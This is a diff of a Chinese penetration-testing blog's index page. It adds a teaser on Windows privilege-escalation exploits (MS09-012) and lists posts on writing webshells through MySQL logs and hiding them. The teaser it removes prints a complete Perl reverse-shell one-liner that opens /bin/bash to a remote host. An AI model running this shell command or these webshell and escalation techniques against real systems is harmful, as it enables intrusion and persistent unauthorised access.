@@ -139,6 +139,39 @@
 
     <div class="post-header index">
         <h1 class="title">
+            <a href="/2017/04/22/win-0day-privilege/">
+                windows 溢出提权小记
+            </a>
+        </h1>
+        <div class="post-info">
+            
+                <span class="date">2017-04-22</span>
+            
+            
+            
+                <span class="category">
+                    <a href="/categories/exp/">exp</a>
+                </span>
+            
+        </div>
+    </div>
+
+    
+        <div class="content">
+            <p><br></p>
+<h5 id="平时用的相对比较多-自己就顺手记录了一份-不大完整-关键是大家能用上就好-都是一些已知的windows-0day-exp-关于各个漏洞的详情-请自行查阅微软安全公告-链接如下"><a href="#平时用的相对比较多-自己就顺手记录了一份-不大完整-关键是大家能用上就好-都是一些已知的windows-0day-exp-关于各个漏洞的详情-请自行查阅微软安全公告-链接如下" class="headerlink" title="平时用的相对比较多,自己就顺手记录了一份,不大完整,关键是大家能用上就好,都是一些已知的windows 0day exp,关于各个漏洞的详情,请自行查阅微软安全公告,链接如下:"></a>平时用的相对比较多,自己就顺手记录了一份,不大完整,关键是大家能用上就好,都是一些已知的windows 0day exp,关于各个漏洞的详情,请自行查阅微软安全公告,链接如下:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="symbol">https:</span>/<span class="regexp">/technet.microsoft.com/zh</span>-cn/library/security/dn639106.aspx</div></pre></td></tr></table></figure>
+<h5 id="具体exp如下"><a href="#具体exp如下" class="headerlink" title="具体exp如下:"></a>具体exp如下:</h5><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">RPCSS服务没有正确地隔离NetworkService或LocalService帐号下运行的进程,本地攻击者可以利用令牌劫持的方式获得权限提升</div><div class="line">漏洞代号: MS09-<span class="number">012</span></div><div class="line">补丁编号: KB952004</div><div class="line">exp 用途: 本地提权</div><div class="line">适应平台: 针对<span class="number">03</span>以下系统,菜刀可用</div><div class="line">用法<span class="symbol">:</span></div></pre></td></tr></table></figure>
+        </div>
+        <a href="/2017/04/22/win-0day-privilege/" class="read-more">Read More</a>
+    
+
+</div>
+            
+                
+<div class="post">
+
+    <div class="post-header index">
+        <h1 class="title">
             <a href="/2017/03/24/mysql-log-write-webshell/">
                 利用mysql的general log 写shell[突破into outfile]
             </a>
@@ -358,39 +391,6 @@
 <p>3,webshell所在目录的层级自然是越深越好,平时网站不出问题的话,一般四五级目录里面很少会被人注意到……<br>
         </div>
         <a href="/2016/10/05/hidden-webshell/" class="read-more">Read More</a>
-    
-
-</div>
-            
-                
-<div class="post">
-
-    <div class="post-header index">
-        <h1 class="title">
-            <a href="/2016/09/27/revese-shell/">
-                很多时候你需要的也许只是一个shell
-            </a>
-        </h1>
-        <div class="post-info">
-            
-                <span class="date">2016-09-27</span>
-            
-            
-            
-                <span class="category">
-                    <a href="/categories/shell/">shell</a>
-                </span>
-            
-        </div>
-    </div>
-
-    
-        <div class="content">
-            <p><br></p>
-<h5 id="前言"><a href="#前言" class="headerlink" title="前言:"></a>前言:</h5><p>&nbsp;&nbsp;&nbsp;&nbsp;很多时候,在实际渗透过程中想进行某些操作,我们迫切的需要一个可交互的shell,但你又不想上传工具到目标机器上,怎么办呢,希望下面的内容能对你有用,”利用目标机器上现有的环境弹回一个可交互的shell”(没错,coablt strike &amp; msf 会更方便,但今天只单纯的说reverse shell):<br><br></p>
-<h5 id="首先-可以先尝试利用linux系统现有的各种环境来弹shell"><a href="#首先-可以先尝试利用linux系统现有的各种环境来弹shell" class="headerlink" title="首先,可以先尝试利用linux系统现有的各种环境来弹shell:"></a>首先,可以先尝试利用linux系统现有的各种环境来弹shell:</h5><p>1,利用perl反弹,也是个人比较推荐的方式,因为现在几乎主流的linux发行版都已经预装了perl,你会发现很多大马里面默认也都会选择使用perl<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="comment"># perl -e 'use Socket;$i="192.168.3.251";$p=8080;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/bash -i");&#125;;'</span></div></pre></td></tr></table></figure></p>
-        </div>
-        <a href="/2016/09/27/revese-shell/" class="read-more">Read More</a>
     
 
 </div>
